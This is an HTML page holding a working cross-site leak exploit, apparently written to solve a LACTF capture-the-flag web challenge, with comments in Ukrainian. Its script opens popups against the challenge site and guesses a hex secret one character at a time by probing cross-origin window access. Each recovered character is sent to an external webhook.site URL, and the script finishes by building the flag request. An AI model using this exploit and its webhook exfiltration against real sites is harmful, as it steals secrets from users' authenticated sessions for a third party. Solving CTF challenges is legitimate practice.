<!DOCTYPE html>
<html>
<head>
    <title>LACTF Exploit</title>
</head>
<body>
    <h1 id="status">Starting Exploit...</h1>
    <div id="log"></div>
    <script>
        const TARGET = "https://append-note-5pesa.instancer.lac.tf";
        const WEBHOOK = "https://webhook.site/3608fd1d-cde5-4658-8c8b-3c282b99ce9c";
        const ALPHABET = "0123456789abcdef";
        let secret = "";

        const report = (msg) => {
            console.log(msg);
            document.getElementById('log').innerText += msg + "\n";
            fetch(`${WEBHOOK}?data=${encodeURIComponent(msg)}`, {mode: 'no-cors'});
        };

        async function testChar(char) {
            return new Promise((resolve) => {
                const attempt = secret + char;
                // Відкриваємо вікно. target='leak' дозволяє перевикористовувати одне вікно
                const win = window.open(`${TARGET}/append?content=${attempt}&url=${TARGET}/favicon.ico`, 'leak');
                
                if (!win) {
                    report("POPUP_BLOCKED");
                    resolve(false);
                    return;
                }

                // Чекаємо обробки. 200 OK з рендерингом шаблону зазвичай 
                // викликає SOP error трохи інакше, ніж миттєвий 404
                setTimeout(() => {
                    try {
                        // Спроба доступу до крос-доменного вікна
                        const dummy = win.location.href;
                        // Якщо ми тут — ми НЕ на TARGET (що дивно)
                        win.close();
                        resolve(false);
                    } catch (e) {
                        // SOP Triggered! Це значить, що вікно на TARGET.
                        // Оскільки ми йдемо по черзі, перший SOP для нового префікса 
                        // підтверджує, що він вірний (або вже був доданий).
                        win.close();
                        resolve(true);
                    }
                }, 500);
            });
        }

        async function solve() {
            report("EXPLOIT_RUNNING_V5");
            
            for (let i = 0; i < 8; i++) {
                for (let char of ALPHABET) {
                    document.getElementById('status').innerText = `Testing: ${secret}${char}`;
                    
                    if (await testChar(char)) {
                        secret += char;
                        report(`[+]_FOUND_CHAR:_${char}_|_FULL:_${secret}`);
                        
                        // Робимо невелику паузу перед наступним символом
                        await new Promise(r => setTimeout(r, 200));
                        break; 
                    }
                }
            }
            report(`!!!_FINAL_SECRET_!!!:_${secret}`);
            report(`GET_FLAG:_${TARGET}/flag?secret=${secret}`);
        }

        // Бот зачекає завантаження і запустить скрипт
        window.onload = () => {
            setTimeout(solve, 1000);
        };
    </script>
</body>
</html>